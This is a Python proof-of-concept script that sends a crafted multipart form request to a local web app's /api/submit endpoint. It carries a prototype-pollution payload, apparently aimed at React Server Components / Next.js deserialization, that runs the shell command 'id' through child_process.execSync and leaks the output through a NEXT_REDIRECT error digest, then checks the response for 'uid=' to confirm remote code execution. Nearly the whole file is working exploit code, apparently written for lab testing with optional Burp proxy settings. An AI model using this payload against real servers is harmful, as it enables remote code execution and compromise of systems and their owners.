import requests

url = "http://localhost:3000/api/submit"

boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}"
}

# Payload constructed to target the 'processProjectSubmission' function
# Field "0" (JSON Config) -> parsed -> polluted
payload_body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="0"\r\n\r\n'
    '{"then": "$1:__proto__:then","status": "resolved_model","reason": -1,"value": "{\\"then\\":\\"$B1337\\"}", "_response": {"_prefix": "var res=process.mainModule.require(\'child_process\').execSync(\'id\',{\'timeout\':5000}).toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'), {digest:`${res}`});", "_chunks": "$Q2", "_formData": {"get": "$1:constructor:constructor"}}}\r\n'
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="1"\r\n\r\n'
    '"$@0"\r\n'
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="2"\r\n\r\n'
    '[]\r\n'
    f"--{boundary}--\r\n"
)

# Proxy settings for Burp Suite (uncomment to use)
# proxies = {
#    "http": "http://127.0.0.1:8080",
#    "https": "http://127.0.0.1:8080",
# }
proxies = None

try:
    print(f"Sending exploit to {url}...")
    # Add proxies=proxies to route traffic through Burp
    response = requests.post(url, headers=headers, data=payload_body, proxies=proxies)
    
    # Check both header (as per new spec) and body
    digest_header = response.headers.get('X-Preview-Digest', '')
    
    print(f"Response Status: {response.status_code}")
    print(f"X-Preview-Digest: {digest_header}")
    
    if "uid=" in digest_header or "uid=" in response.text:
        print("\n[+] SUCCESS: RCE confirmed! Found 'uid=' in response/header.")
    else:
        print("\n[-] FAILURE: RCE output not found.")
        print("Response Body Snippet:", response.text[:200])
        
except Exception as e:
    print(f"Error: {e}")
